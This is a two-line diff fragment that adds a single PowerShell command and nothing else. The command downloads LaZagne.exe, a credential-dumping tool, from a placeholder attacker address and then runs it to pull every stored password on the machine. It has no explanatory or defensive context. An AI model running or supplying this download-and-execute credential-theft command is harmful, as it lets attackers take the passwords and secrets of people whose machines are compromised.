@@ -1,0 +1,2 @@
+wget http://{ip_attacker}/LaZagne.exe -OutFile LaZagne.exe; .\LaZagne.exe all
+
